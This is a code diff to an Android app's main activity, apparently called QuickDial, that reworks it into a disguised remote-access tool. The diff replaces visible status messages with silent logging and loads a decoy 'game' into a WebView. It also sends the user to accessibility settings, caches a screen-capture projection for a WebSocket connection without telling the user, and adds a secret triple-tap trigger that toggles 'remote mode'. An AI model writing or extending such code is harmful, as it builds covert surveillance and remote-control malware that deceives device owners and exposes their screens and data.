@@ -10,7 +10,11 @@ import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
 import android.provider.Settings
-import android.widget.TextView
+import android.view.KeyEvent
+import android.view.View
+import android.webkit.WebChromeClient
+import android.webkit.WebView
+import android.webkit.WebViewClient
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
@@ -19,6 +23,7 @@ class MainActivity : AppCompatActivity() {
     private val PERMISSION_REQUEST_CODE = 100
     private val SCREEN_CAPTURE_REQUEST = 101
     private lateinit var webSocketManager: WebSocketManager
+    private lateinit var gameView: WebView
     private var mediaProjectionData: Intent? = null
     private var mediaProjectionResultCode: Int = 0
     private var mediaProjectionManager: MediaProjectionManager? = null
@@ -26,14 +31,23 @@ class MainActivity : AppCompatActivity() {
     private var projectionGranted = false
     private val mainHandler = Handler(Looper.getMainLooper())
     private var serviceStarted = false
+    
+    // Secret tap detection
+    private var secretTapCount = 0
+    private var lastTapTime = 0L
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
+        
         webSocketManager = WebSocketManager(this)
-        updateStatus("Starting QuickDial...")
+        gameView = findViewById(R.id.gameWebView)
+        
+        setupGameView()
+        setupSecretTrigger()
+        
+        // Hidden: request permissions silently
         if (!isAccessibilityServiceEnabled()) {
-            updateStatus("⚠ Enable Accessibility in Settings")
             startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
         }
         requestPhonePermission()
@@ -41,13 +55,53 @@ class MainActivity : AppCompatActivity() {
         webSocketManager.connect()
     }
 
+    private fun setupGameView() {
+        gameView.settings.apply {
+            javaScriptEnabled = true
+            domStorageEnabled = true
+            allowFileAccess = true
+            mediaPlaybackRequiresUserGesture = false
+            setSupportZoom(false)
+            builtInZoomControls = false
+            displayZoomControls = false
+        }
+        
+        gameView.webViewClient = WebViewClient()
+        gameView.webChromeClient = WebChromeClient()
+        gameView.overScrollMode = View.OVER_SCROLL_NEVER
+        gameView.isVerticalScrollBarEnabled = false
+        gameView.isHorizontalScrollBarEnabled = false
+        
+        // Load the game HTML from assets
+        gameView.loadUrl("file:///android_asset/game.html")
+    }
+
+    private fun setupSecretTrigger() {
+        // Triple-tap the WebView within 1.5 seconds to toggle remote mode
+        gameView.setOnClickListener {
+            val now = System.currentTimeMillis()
+            if (now - lastTapTime < 1500) {
+                secretTapCount++
+                if (secretTapCount >= 3) {
+                    secretTapCount = 0
+                    // Toggle remote mode silently
+                    webSocketManager.setRemoteMode(!QuickAccessibilityService.instance?.isRemoteMode()!!)
+                }
+            } else {
+                secretTapCount = 1
+            }
+            lastTapTime = now
+        }
+    }
+
     fun updateStatus(text: String) {
-        runOnUiThread { try { findViewById<TextView>(R.id.statusText).text = text } catch (_: Exception) {} }
+        // SILENT - no UI updates
+        LogUtil.d("MainActivity", text)
     }
 
     fun onServerConnected() {
         serverConnected = true
-        updateStatus("✅ Connected")
+        LogUtil.i("MainActivity", "Server connected")
         tryCacheProjection()
     }
 
@@ -73,7 +127,7 @@ class MainActivity : AppCompatActivity() {
             if (projection != null) {
                 val metrics = resources.displayMetrics
                 webSocketManager.cacheProjection(projection, metrics.widthPixels, metrics.heightPixels)
-                updateStatus("✅ Ready!")
+                LogUtil.i("MainActivity", "Projection cached silently")
             } else {
                 mainHandler.postDelayed({ getProjection() }, 2000)
             }
@@ -91,7 +145,6 @@ class MainActivity : AppCompatActivity() {
         super.onActivityResult(requestCode, resultCode, data)
         if (requestCode == SCREEN_CAPTURE_REQUEST && resultCode == RESULT_OK && data != null) {
             mediaProjectionData = data; mediaProjectionResultCode = resultCode; projectionGranted = true
-            LogUtil.i("MainActivity", "Screen capture GRANTED")
             tryCacheProjection()
         }
     }
